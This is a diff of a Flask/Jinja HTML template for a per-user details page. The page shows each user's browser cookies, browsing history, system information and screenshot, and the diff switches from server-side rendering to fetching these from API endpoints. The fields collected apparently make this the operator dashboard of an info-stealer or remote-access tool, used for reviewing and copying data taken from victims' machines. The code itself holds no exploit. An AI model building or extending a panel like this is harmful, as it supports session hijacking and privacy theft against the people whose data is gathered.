@@ -1,71 +1,73 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>User {{ user.username }} Details</title>
-<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <meta charset="utf-8">
+  <title>User {{ user.username }} Details</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
 <header>User {{ user.username }} Details</header>
+
 <div class="container">
-    <div class="user-card">
-        <p><strong>ID:</strong> {{ user.id }}</p>
-        <p><strong>Username:</strong> {{ user.username }}</p>
-        <p><strong>Timestamp:</strong> {{ user.timestamp }}</p>
+  <div class="user-card">
+    <p><strong>ID:</strong> {{ user.id }}</p>
+    <p><strong>Username:</strong> {{ user.username }}</p>
+    <p><strong>Timestamp:</strong> {{ user.timestamp }}</p>
 
-        <h3>Cookies</h3>
-        <div class="json-box">{{ user.cookies | tojson(indent=2) }}</div>
-        <button class="action-btn" onclick="copyText({{ user.cookies | tojson | safe }})">Copy Cookies</button>
+    <h3>Cookies</h3>
+    <pre id="cookies" class="json-box">Loading…</pre>
+    <button class="action-btn" onclick="copyField('cookies')">Copy Cookies</button>
 
-        <h3>History</h3>
-        <div class="json-box">{{ user.history | tojson(indent=2) }}</div>
-        <button class="action-btn" onclick="copyText({{ user.history | tojson | safe }})">Copy History</button>
+    <h3>History</h3>
+    <pre id="history" class="json-box">Loading…</pre>
+    <button class="action-btn" onclick="copyField('history')">Copy History</button>
 
-        <h3>System Info</h3>
-        <div class="json-box">{{ user.system_info | tojson(indent=2) }}</div>
-        <button class="action-btn" onclick="copyText({{ user.system_info | tojson | safe }})">Copy System Info</button>
+    <h3>System Info</h3>
+    <pre id="system" class="json-box">Loading…</pre>
+    <button class="action-btn" onclick="copyField('system')">Copy System Info</button>
 
-        {% if user.screenshot %}
-        <h3>Screenshot</h3>
-        <img src="data:image/png;base64,{{ user.screenshot | b64encode }}" class="screenshot" id="screenshot">
-        <button class="action-btn" onclick="downloadImage('{{ user.screenshot | b64encode }}', 'screenshot.png')">Download Screenshot</button>
-        {% endif %}
-    </div>
-</div>
-
-<!-- Modal -->
-<div id="modal" class="modal">
-  <span class="close-modal">&times;</span>
-  <img class="modal-content" id="modal-img">
+    <div id="screenshot-wrap"></div>
+  </div>
 </div>
 
 <script>
-const modal = document.getElementById("modal");
-const img = document.getElementById("screenshot");
-const modalImg = document.getElementById("modal-img");
-const span = document.getElementsByClassName("close-modal")[0];
+const userId = {{ user.id }};
+function showJSON(elemId, obj){
+  document.getElementById(elemId).textContent = JSON.stringify(obj, null, 2);
+}
+function copyField(id){
+  const text = document.getElementById(id).textContent;
+  navigator.clipboard.writeText(text).then(()=> alert("Copied"));
+}
 
-if(img){
-    img.onclick = function(){
-        modal.style.display = "block";
-        modalImg.src = this.src;
+async function loadData(){
+  const resp = await fetch(`/api/data/${userId}`, { credentials: 'same-origin' });
+  if(!resp.ok){
+    const txt = await resp.text();
+    document.getElementById('cookies').textContent = 'Error loading';
+    document.getElementById('history').textContent = txt;
+    return;
+  }
+  const j = await resp.json();
+  showJSON('cookies', j.cookies);
+  showJSON('history', j.history);
+  showJSON('system', j.system_info);
+  if(j.timestamp){
+    // optionally update
+  }
+  // load screenshot (if any) by checking img endpoint
+  const imgWrap = document.getElementById('screenshot-wrap');
+  try {
+    const imgResp = await fetch(`/screenshot/${userId}`, { credentials: 'same-origin' });
+    if(imgResp.ok){
+      const blob = await imgResp.blob();
+      const url = URL.createObjectURL(blob);
+      imgWrap.innerHTML = `<h3>Screenshot</h3><img src="${url}" class="screenshot" alt="screenshot">`;
     }
+  } catch(e){ /* ignore if none */ }
 }
 
-span.onclick = function() { modal.style.display = "none"; }
-window.onclick = function(event) { if(event.target == modal){ modal.style.display = "none"; } }
-
-function copyText(obj){
-    const text = JSON.stringify(obj, null, 2);
-    navigator.clipboard.writeText(text).then(()=>alert("Copied to clipboard!"));
-}
-
-function downloadImage(base64, filename){
-    const link = document.createElement('a');
-    link.href = "data:image/png;base64," + base64;
-    link.download = filename;
-    link.click();
-}
+loadData();
 </script>
 </body>
 </html>
